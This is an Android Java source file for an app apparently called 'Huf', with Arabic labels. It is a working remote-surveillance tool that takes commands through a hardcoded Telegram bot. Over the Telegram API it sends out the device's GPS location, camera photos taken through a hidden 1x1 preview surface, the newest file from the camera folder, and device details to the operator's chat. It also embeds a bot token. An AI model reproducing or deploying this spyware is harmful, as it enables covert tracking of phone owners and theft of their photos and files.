package com.huf.bot;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity implements SurfaceHolder.Callback {

    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";
    private final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private boolean isRunning = true;
    private Context context;
    private SurfaceView surfaceView;
    private Camera camera;
    private boolean isFrontCam = true;

    // كود طلب الصلاحيات
    private static final int PERMISSION_REQUEST_CODE = 123;
    private boolean hasPermissions = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = this;

        // طلب الصلاحيات أولاً
        if (checkAndRequestPermissions()) {
            hasPermissions = true;
        }

        // بناء الواجهة
        LinearLayout rootLayout = new LinearLayout(this);
        rootLayout.setOrientation(LinearLayout.VERTICAL);
        rootLayout.setBackgroundColor(Color.parseColor("#0F172A"));

        LinearLayout header = new LinearLayout(this);
        header.setBackgroundColor(Color.parseColor("#1E293B"));
        header.setPadding(20, 40, 20, 40);
        TextView title = new TextView(this);
        title.setText("Huf - لوحة التحكم");
        title.setTextColor(Color.WHITE);
        title.setTextSize(20);
        header.addView(title);
        rootLayout.addView(header);

        ScrollView scrollView = new ScrollView(this);
        GridLayout grid = new GridLayout(this);
        grid.setColumnCount(2);
        grid.setPadding(10, 10, 10, 10);

        addButton(grid, "🔋 البطارية", "BATTERY");
        addButton(grid, "📍 الموقع", "LOCATION");
        addButton(grid, "📸 كاميرا خلفية", "CAM_BACK");
        addButton(grid, "📸 كاميرا أمامية", "CAM_FRONT");
        addButton(grid, "📁 سحب ملفات", "FILES");
        addButton(grid, "📱 معلومات الجهاز", "DEVICE");
        addButton(grid, "🗑️ إزالة التطبيق", "UNINSTALL");

        scrollView.addView(grid);
        rootLayout.addView(scrollView);

        surfaceView = new SurfaceView(this);
        surfaceView.setLayoutParams(new LinearLayout.LayoutParams(1, 1));
        surfaceView.getHolder().addCallback(this);
        rootLayout.addView(surfaceView);

        setContentView(rootLayout);

        sendMessageToTelegram("📱 التطبيق يعمل الآن!\nالجهاز متصل.");

        startPolling();
    }

    // دالة طلب الصلاحيات
    private boolean checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            List<String> permissionsNeeded = new ArrayList<>();
            
            String[] permissions = new String[]{
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            };

            for (String p : permissions) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(p);
                }
            }

            if (!permissionsNeeded.isEmpty()) {
                requestPermissions(permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            hasPermissions = true;
            Toast.makeText(this, "تم طلب الصلاحيات", Toast.LENGTH_SHORT).show();
        }
    }

    private void addButton(GridLayout grid, String text, final String action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#334155"));
        btn.setTextSize(12);
        
        GridLayout.LayoutParams params = new GridLayout.LayoutParams();
        params.width = 0;
        params.height = GridLayout.LayoutParams.WRAP_CONTENT;
        params.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        params.setMargins(5, 5, 5, 5);
        btn.setLayoutParams(params);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(context, "جاري التنفيذ: " + action, Toast.LENGTH_SHORT).show();
                executeAction(action);
            }
        });

        grid.addView(btn);
    }

    private void executeAction(String action) {
        switch (action) {
            case "BATTERY":
                getBatteryInfo();
                break;
            case "LOCATION":
                getLocation();
                break;
            case "CAM_FRONT":
                isFrontCam = true;
                takePhoto();
                break;
            case "CAM_BACK":
                isFrontCam = false;
                takePhoto();
                break;
            case "FILES":
                uploadFile(new File(Environment.getExternalStorageDirectory(), "DCIM/Camera"));
                break;
            case "DEVICE":
                getDeviceInfo();
                break;
            case "UNINSTALL":
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                break;
            default:
                sendMessageToTelegram("⚠️ الأمر " + action + " غير مفعل برمجياً بعد.");
        }
    }

    private void getBatteryInfo() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        int batteryPct = (int) ((level / (float) scale) * 100);
        sendMessageToTelegram("🔋 نسبة البطارية: " + batteryPct + "%");
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (location != null) {
                String locUrl = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessageToTelegram("📍 الموقع الحالي:\n" + locUrl);
            } else {
                sendMessageToTelegram("⚠️ لا توجد بيانات موقع. تأكد من تشغيل GPS وإعطاء الصلاحيات.");
            }
        } catch (SecurityException e) {
            sendMessageToTelegram("⚠️ صلاحية الموقع مرفوضة.");
        }
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {}
    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {}

    private void takePhoto() {
        try {
            int cameraId = -1;
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (isFrontCam && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = i;
                    break;
                } else if (!isFrontCam && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = i;
                    break;
                }
            }
            if (cameraId == -1) {
                sendMessageToTelegram("⚠️ لا توجد كاميرا متاحة.");
                return;
            }

            camera = Camera.open(cameraId);
            camera.setPreviewDisplay(surfaceView.getHolder());
            camera.startPreview();
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    sendPhotoToTelegram(data);
                    camera.stopPreview();
                    camera.release();
                    camera = null;
                }
            });
        } catch (Exception e) {
            sendMessageToTelegram("⚠️ فشل تشغيل الكاميرا: " + e.getMessage());
        }
    }

    private void getDeviceInfo() {
        String info = "📱 معلومات الجهاز:\n" +
                "الموديل: " + android.os.Build.MODEL + "\n" +
                "الشركة: " + android.os.Build.MANUFACTURER + "\n" +
                "إصدار أندرويد: " + android.os.Build.VERSION.RELEASE + "\n" +
                "رقم الإصدار: " + android.os.Build.ID;
        sendMessageToTelegram(info);
    }

    private void uploadFile(File dir) {
        if (!dir.exists() || dir.listFiles() == null) {
            sendMessageToTelegram("⚠️ المجلد غير موجود.");
            return;
        }
        File[] files = dir.listFiles();
        if (files.length == 0) {
            sendMessageToTelegram("⚠️ المجلد فارغ.");
            return;
        }
        File latest = files[0];
        for (File f : files) {
            if (f.lastModified() > latest.lastModified()) latest = f;
        }
        sendMessageToTelegram("📁 جاري سحب الملف: " + latest.getName() + " (" + (latest.length()/1024) + " KB)");
        sendFileToTelegram(latest);
    }

    private void sendMessageToTelegram(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.getInputStream(); 
                } catch (Exception e) {
                    Log.e("HufBot", "Error sending message", e);
                }
            }
        }).start();
    }

    private void sendPhotoToTelegram(final byte[] imageData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String boundary = "*****" + System.currentTimeMillis() + "*****";
                    String lineEnd = "\r\n";
                    String twoHyphens = "--";

                    URL url = new URL(API_URL + "sendPhoto");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                    dos.writeBytes(CHAT_ID + lineEnd);

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"photo.jpg\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.write(imageData);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                    dos.flush();
                    dos.close();
                    conn.getResponseCode();
                } catch (Exception e) {
                    Log.e("HufBot", "Error sending photo", e);
                }
            }
        }).start();
    }

    private void sendFileToTelegram(final File file) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String boundary = "*****" + System.currentTimeMillis() + "*****";
                    String lineEnd = "\r\n";
                    String twoHyphens = "--";

                    URL url = new URL(API_URL + "sendDocument");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                    dos.writeBytes(CHAT_ID + lineEnd);

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
                    dos.writeBytes(lineEnd);

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                    fis.close();

                    dos.writeBytes(lineEnd);
                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                    dos.flush();
                    dos.close();

                    int responseCode = conn.getResponseCode();
                    sendMessageToTelegram("✅ تم رفع الملف. كود الاستجابة: " + responseCode);
                } catch (Exception e) {
                    sendMessageToTelegram("⚠️ فشل رفع الملف: " + e.getMessage());
                }
            }
        }).start();
    }

    private void startPolling() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int lastUpdateId = 0;
                while (isRunning) {
                    try {
                        String urlString = API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
                        URL url = new URL(urlString);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");

                        if (conn.getResponseCode() == 200) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                response.append(line);
                            }
                            reader.close();
                            String json = response.toString();
                            
                            if (json.contains("\"update_id\"")) {
                                int start = json.indexOf("\"update_id\":") + 12;
                                int end = json.indexOf(",", start);
                                String idStr = json.substring(start, end).trim();
                                lastUpdateId = Integer.parseInt(idStr);
                                
                                if (json.contains("\"text\":\"")) {
                                    int tStart = json.indexOf("\"text\":\"") + 8;
                                    int tEnd = json.indexOf("\"", tStart);
                                    String text = json.substring(tStart, tEnd);
                                    
                                    if (text.equals("/battery")) executeAction("BATTERY");
                                    else if (text.equals("/location")) executeAction("LOCATION");
                                    else if (text.equals("/cam_front")) executeAction("CAM_FRONT");
                                    else if (text.equals("/cam_back")) executeAction("CAM_BACK");
                                    else if (text.equals("/files")) executeAction("FILES");
                                    else if (text.equals("/device")) executeAction("DEVICE");
                                    else if (text.equals("/start")) sendMessageToTelegram("✅ البوت جاهز.\nالأوامر:\n/battery\n/location\n/cam_front\n/cam_back\n/files\n/device");
                                }
                            }
                        }
                        Thread.sleep(2000);
                    } catch (Exception e) {
                        Log.e("HufBot", "Polling error", e);
                        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                    }
                }
            }
        }).start();
    }
}